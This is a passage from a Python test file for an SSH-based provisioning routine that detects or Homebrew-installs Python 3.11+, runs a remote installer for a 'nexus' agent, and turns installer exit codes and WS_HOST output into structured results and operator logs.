    """remote_python bypasses RESOLVE_PY and the Homebrew fallback.

    Lets an operator point at a non-standard interpreter; running detection
    anyway would either override the pin or waste round trips.
    """
    result, client = run_provision(
        remote_python="/opt/py/bin/python3.13", handler=_remote(resolve=(1, "", ""))
    )

    assert result["ok"] is True
    assert not any("bash -c" in cmd for cmd in client.cmds)
    assert "Remote Python: /opt/py/bin/python3.13" in result["log"]
    assert _install_argv(client)[2] == "/opt/py/bin/python3.13"


def test_provision_strips_whitespace_from_the_detected_interpreter_path(run_provision):
    """RESOLVE_PY stdout is stripped before use.

    The remote script ``echo``es the path, so the trailing newline would
    otherwise be embedded in the quoted argument and break ``$PY -m venv``.
    """
    _result, client = run_provision(
        handler=_remote(resolve=(0, "  /usr/bin/python3.11 \n\n", ""))
    )

    assert _install_argv(client)[2] == "/usr/bin/python3.11"


def test_provision_treats_a_nonzero_resolve_exit_as_no_python(run_provision):
    """Stdout from a failed RESOLVE_PY is ignored — only rc==0 counts.

    RESOLVE_PY exits 1 when nothing suitable is found; trusting its stdout
    anyway could hand a 3.10 interpreter to the installer.
    """
    result, _client = run_provision(
        handler=_remote(resolve=(1, "/usr/bin/python3.9\n", "")), install_python=False
    )

    assert result["ok"] is False
    assert result["error"] == "No Python >=3.11 on remote (enable 'install Python')."


def test_provision_treats_empty_resolve_output_as_no_python(run_provision):
    """rc==0 with blank stdout is still "not found" (boundary on the strip)."""
    result, _client = run_provision(
        handler=_remote(resolve=(0, "   \n", "")), install_python=False
    )

    assert result["ok"] is False
    assert result["error"] == "No Python >=3.11 on remote (enable 'install Python')."


def test_provision_without_install_python_never_probes_for_homebrew(run_provision):
    """install_python=False short-circuits before the brew search.

    The flag exists so an operator can refuse a multi-minute Homebrew build;
    probing anyway would be harmless but installing would not.
    """
    _result, client = run_provision(
        handler=_remote(resolve=(1, "", "")), install_python=False
    )

    assert _brew_probes(client) == []
    assert not any("install python@3.12" in cmd for cmd in client.cmds)


def test_provision_installs_python_via_homebrew_then_re_resolves(run_provision):
    """No Python -> brew install python@3.12 -> re-detect -> continue.

    The formula drops a versioned binary that was not on PATH during the first
    probe, so the second RESOLVE_PY is required; skipping it would report
    "no Python" right after a successful install.
    """
    resolve_pair = [(1, "", ""), (0, "/opt/homebrew/bin/python3.12\n", "")]
    result, client = run_provision(
        handler=_remote(
            resolve=resolve_pair,
            brew_probe=lambda cmd: (0, "", "") if "/opt/homebrew/bin/brew" in cmd else (1, "", ""),
        )
    )

    assert result["ok"] is True
    assert "/opt/homebrew/bin/brew install python@3.12" in client.cmds
    assert len([c for c in client.cmds if "bash -c" in c]) == 2
    assert _install_argv(client)[2] == "/opt/homebrew/bin/python3.12"
    assert any("installing python@3.12 via Homebrew" in line for line in result["log"])


def test_provision_probes_every_homebrew_location_in_preference_order(run_provision):
    """brew is looked for at both Homebrew prefixes and then on PATH.

    Apple-silicon (/opt/homebrew) and Intel (/usr/local) prefixes differ, and a
    login shell's PATH is not available over a non-interactive SSH exec.
    """
    result, client = run_provision(handler=_remote(resolve=(1, "", "")))

    assert result["ok"] is False
    assert result["error"] == "No Python >=3.11 and Homebrew not found on remote."
    assert _brew_probes(client) == [
        "command -v '/opt/homebrew/bin/brew'",
        "command -v '/usr/local/bin/brew'",
        "command -v 'brew'",
    ]


def test_provision_reports_a_failed_brew_install_with_truncated_stderr(run_provision):
    """A brew failure surfaces its stderr, capped at 400 characters.

    brew is extremely verbose on failure; the cap keeps the JSON error readable
    (the full text is not otherwise available to the caller).
    """
    noisy = "E" * 1000
    result, _client = run_provision(
        handler=_remote(
            resolve=(1, "", ""), brew_probe=(0, "", ""), brew_install=(1, "", noisy)
        )
    )

    assert result["ok"] is False
    assert result["error"] == "brew install failed: " + "E" * 400
    assert len(result["error"]) == len("brew install failed: ") + 400


def test_provision_reports_brew_stdout_when_stderr_is_empty(run_provision):
    """``(e or o)`` falls back to stdout so the failure is never blank.

    Homebrew writes some fatal diagnostics to stdout; an empty error string
    would leave the operator with nothing to act on.
    """
    result, _client = run_provision(
        handler=_remote(
            resolve=(1, "", ""),
            brew_probe=(0, "", ""),
            brew_install=(1, "  Error: formula not found  ", ""),
        )
    )

    assert result["error"] == "brew install failed: Error: formula not found"


def test_provision_errors_when_python_is_still_missing_after_brew(run_provision):
    """A successful brew install that yields no 3.11+ interpreter still fails.

    Guards the "install succeeded, detection failed" corner — without the final
    check the installer would be invoked with an empty ``$PY``.
    """
    result, _client = run_provision(
        handler=_remote(resolve=(1, "", ""), brew_probe=(0, "", ""), brew_install=(0, "", ""))
    )

    assert result["ok"] is False
    assert result["error"] == "No Python >=3.11 on remote (enable 'install Python')."


# ── provision: installer failures ────────────────────────────────────────────


def test_provision_explains_a_no_ws_route_failure_with_every_candidate(run_provision):
    """Exit 7 / NO_WS_ROUTE produces the routing-diagnosis error, not a raw dump.

    "install worked but the WebSocket never connects" is the most common failure
    on asymmetric LANs, so the message names every address tried and points at
    the fix instead of surfacing shell output.
    """
    result, _client = run_provision(
        handler=_remote(install=(7, "cloning…\nNO_WS_ROUTE\n", "")),
        server_ips=["srv.local", "10.0.0.5"],
    )

    assert result["ok"] is False
    assert "could not complete a WebSocket handshake to ANY server address" in result["error"]
    assert "srv.local, 10.0.0.5" in result["error"]
    assert "ws_host" in result["error"]
    assert "cloning…" in result["log"]
    assert "ws_url" not in result


def test_provision_detects_no_ws_route_reported_on_stderr(run_provision):
    """The NO_WS_ROUTE marker is matched across stdout AND stderr.

    ``set -e`` plus shell tracing can push the marker to stderr; matching only
    stdout would downgrade this to the generic "Install failed" message.
    """
    result, _client = run_provision(handler=_remote(install=(7, "", "NO_WS_ROUTE\n")))

    assert "could not complete a WebSocket handshake" in result["error"]


def test_provision_no_ws_route_names_the_localhost_fallback(run_provision):
    """With no candidates the diagnosis reports the localhost fallback."""
    result, _client = run_provision(
        handler=_remote(install=(7, "NO_WS_ROUTE\n", "")), server_ips=[]
    )

    assert "(localhost)" in result["error"]


def test_provision_reports_a_generic_install_failure_with_truncated_stderr(run_provision):
    """Any other non-zero installer exit yields stderr capped at 500 characters."""
    noisy = "X" * 900
    result, _client = run_provision(handler=_remote(install=(3, "NO_GIT\n", noisy)))

    assert result["ok"] is False
    assert result["error"] == "Install failed: " + "X" * 500
    assert "NO_GIT" in result["log"]


def test_provision_reports_installer_stdout_when_stderr_is_empty(run_provision):
    """The generic install error falls back to stdout via ``(e or o)``.

    INSTALL_SH signals its own failures on stdout (NO_GIT, AGENT_DIED), so the
    fallback is the normal case rather than a corner case.
    """
    result, _client = run_provision(
        handler=_remote(install=(5, "AGENT_DIED\nTraceback…\n", ""))
    )

    assert result["ok"] is False
    assert result["error"].startswith("Install failed: AGENT_DIED")


def test_provision_failed_install_keeps_the_operator_log(run_provision):
    """Log lines collected before the failure are returned alongside the error.

    The HTTP layer renders ``log``; dropping it on failure would leave the
    operator with a one-line error and no context.
    """
    result, _client = run_provision(handler=_remote(install=(6, "SERVICE_UNSUPPORTED SunOS\n", "")))

    assert result["log"][0] == "Connected."
    assert "Remote Python: /usr/bin/python3.12" in result["log"]
    assert "SERVICE_UNSUPPORTED SunOS" in result["log"]


def test_provision_does_not_announce_a_callback_address_on_failure(run_provision):
    """A WS_HOST line printed before a later failure is not sold as success.

    The insert only happens on the ok path, so the log must not claim an address
    was selected when the run aborted.
    """
    result, _client = run_provision(
        handler=_remote(install=(5, "WS_HOST 10.0.0.5\nAGENT_DIED\n", ""))
    )

    assert result["ok"] is False
    assert not any("Selected callback address" in line for line in result["log"])


# ── provision: WS_HOST parsing ───────────────────────────────────────────────


def test_provision_falls_back_to_the_first_candidate_without_a_ws_host_line(run_provision):
    """rc==0 but no WS_HOST yields candidates[0] and no "selected" log line.

    Believed unreachable (a missing WS_HOST means exit 7), so this pins the
    defensive fallback rather than a real device behaviour.
    """
    result, _client = run_provision(handler=_remote(install=(0, "AGENT_RUNNING 1\n", "")))

    assert result["ok"] is True
    assert result["ws_host"] == "srv.local"
    assert result["ws_url"] == f"ws://srv.local:8000/ws/agent/{_NODE_ID}"
    assert not any("Selected callback address" in line for line in result["log"])


def test_provision_takes_the_last_ws_host_line_when_several_are_printed(run_provision):
    """Repeated WS_HOST lines: the last wins (documents current behaviour).

    The loop assigns without breaking, so a future installer that logged a
    retry would change the reported address.
    """
    result, _client = run_provision(
        handler=_remote(install=(0, "WS_HOST 10.0.0.5\nWS_HOST 10.0.0.9\n", ""))
    )

    assert result["ws_host"] == "10.0.0.9"


def test_provision_strips_the_parsed_ws_host_value(run_provision):
    """Trailing whitespace/CR around the WS_HOST value is trimmed.

    An untrimmed ``\\r`` would produce ``ws://10.0.0.5\\r:8000/...`` and the
    agent would fail to parse its own configured URL.
    """
    result, _client = run_provision(
        handler=_remote(install=(0, "WS_HOST   10.0.0.5  \r\n", ""))
    )

    assert result["ws_host"] == "10.0.0.5"
    assert result["ws_url"] == f"ws://10.0.0.5:8000/ws/agent/{_NODE_ID}"


def test_provision_appends_non_ws_host_output_lines_in_order(run_provision):
    """Ordinary installer output is appended to the log in emission order."""
    result, _client = run_provision(
        handler=_remote(install=(0, "step one\nWS_HOST 10.0.0.5\nstep two\nstep three\n", ""))
    )

    assert result["log"][-3:] == ["step one", "step two", "step three"]


def test_provision_builds_the_ws_url_from_the_requested_port(run_provision):
    """A non-default ws_port reaches both the installer argv and the ws_url.

    The agent's configured URL and the server's listen port must agree or the
    node never connects.
    """
    result, client = run_provision(ws_port=18080)

    assert _install_argv(client)[7] == "18080"
    assert result["ws_url"] == f"ws://10.0.0.5:18080/ws/agent/{_NODE_ID}"


# ── provision: unexpected exceptions ─────────────────────────────────────────


def test_provision_wraps_an_sftp_failure_as_a_structured_error(run_provision):
    """An exception from open_sftp becomes ``{"ok": False, "error": "Type: msg"}``.

    The catch-all is what keeps unexpected paramiko errors from becoming a 500
    that tells the operator nothing.
    """
    result, client = run_provision(client_kwargs={"sftp_error": OSError("permission denied")})

    assert result["ok"] is False
    assert result["error"] == "OSError: permission denied"
    assert result["log"] == ["Connected.", "Remote Python: /usr/bin/python3.12"]
    assert client.closed == 1


def test_provision_wraps_an_exec_command_failure_as_a_structured_error(run_provision):
    """A dropped session during the first probe is reported, not raised."""
    result, client = run_provision(
        client_kwargs={"exec_error": paramiko.SSHException("channel closed")}
    )

    assert result["ok"] is False
    assert result["error"] == "SSHException: channel closed"
    assert result["log"] == ["Connected."]
    assert client.closed == 1


def test_provision_wraps_undecodable_remote_output_as_a_structured_error(run_provision):
    """Non-UTF-8 installer output surfaces as a UnicodeDecodeError result.

    ``run`` decodes unconditionally; a device emitting latin-1 bytes must not
    take down the request.
    """
    result, client = run_provision(handler=_remote(install=(0, b"\xff\xfe not utf8", "")))

    assert result["ok"] is False
    assert result["error"].startswith("UnicodeDecodeError:")
    assert client.closed == 1


# ── Remote-script contract (static pins) ─────────────────────────────────────


def test_resolve_py_gates_on_python_311_and_probes_both_homebrew_prefixes():
    """RESOLVE_PY accepts 3.11+ only and searches PATH plus both brew prefixes.

    The agent requires 3.11; a widened glob or a 3.10 candidate would install an
    agent that cannot import its own dependencies. Runs only on real devices, so
    this literal has no other coverage.
    """
    assert "case \"$v\" in 3.1[1-9]|3.[2-9]*)" in RESOLVE_PY
    assert "python3.13 python3.12 python3.11" in RESOLVE_PY
    assert "/opt/homebrew/bin/python3.11" in RESOLVE_PY
    assert "/usr/local/bin/python3.11" in RESOLVE_PY
    assert "python3.10" not in RESOLVE_PY
    # Exits non-zero when nothing suitable is found — provision keys off rc==0.
    assert RESOLVE_PY.strip().endswith("exit 1")


def test_install_sh_emits_the_machine_readable_ws_host_line_provision_parses():
    """INSTALL_SH prints exactly ``WS_HOST <addr>``, the one parsed stdout line.

    provision splits on the ``"WS_HOST "`` prefix; renaming or reformatting this
    line silently drops the callback address and triggers the candidates[0]
    fallback.
    """
    assert 'echo "WS_HOST $WS_HOST"' in INSTALL_SH
    assert 'WS="ws://$WS_HOST:$PORT/ws/agent/$NID"' in INSTALL_SH


def test_install_sh_reads_the_nine_positional_arguments_provision_sends():
    """The installer's $1..$9 assignment matches provision's argument order."""
    assert (
        'PY="$1"; RD="$2"; REPO_URL="$3"; BRANCH="$4"; CANDS="$5"; '
        'PORT="$6"; KEY="$7"; NID="$8"; MODE="$9"' in INSTALL_SH
    )


def test_install_sh_failure_markers_and_exit_codes_match_the_documented_mapping():
    """NO_GIT/3, AGENT_DIED/5, SERVICE_UNSUPPORTED/6, NO_WS_ROUTE/7 under set -e.

    provision's error translation reads these markers out of the output stream;
    NO_WS_ROUTE in particular selects the routing-diagnosis message instead of a
    raw shell dump.
    """
    assert INSTALL_SH.startswith("#!/bin/bash\nset -e\n")
    assert 'echo "NO_GIT"; exit 3' in INSTALL_SH
    assert 'echo "NO_WS_ROUTE"; exit 7' in INSTALL_SH
    assert 'echo "SERVICE_UNSUPPORTED $OS"; exit 6' in INSTALL_SH
    assert 'echo "AGENT_DIED"' in INSTALL_SH
    assert "exit 5" in INSTALL_SH


def test_install_sh_tears_down_all_previous_start_mechanisms_before_starting():
    """nohup pid, launchd job and systemd unit are all stopped first.

    Switching a node between background and service mode otherwise leaves two
    agents racing over the same node id and the same WebSocket path.
    """
    assert 'launchctl bootout "gui/$(id -u)/com.nexus.agent" 2>/dev/null || true' in INSTALL_SH
    assert "systemctl --user disable --now nexus-agent 2>/dev/null || true" in INSTALL_SH
    assert 'if [ -f agent.pid ] && kill -0 "$(cat agent.pid)"' in INSTALL_SH


def test_install_sh_installs_workspace_packages_in_dependency_order():
    """common -> steps -> agent, all editable, into a dedicated venv.

    agent imports steps and both import common; installing out of order resolves
    stale copies from PyPI or fails outright.
    """
    common = INSTALL_SH.index("-e packages/common")
    steps = INSTALL_SH.index("-e packages/steps")
    agent = INSTALL_SH.index("-e packages/agent")
    assert common < steps < agent
    assert '"$PY" -m venv .venv' in INSTALL_SH
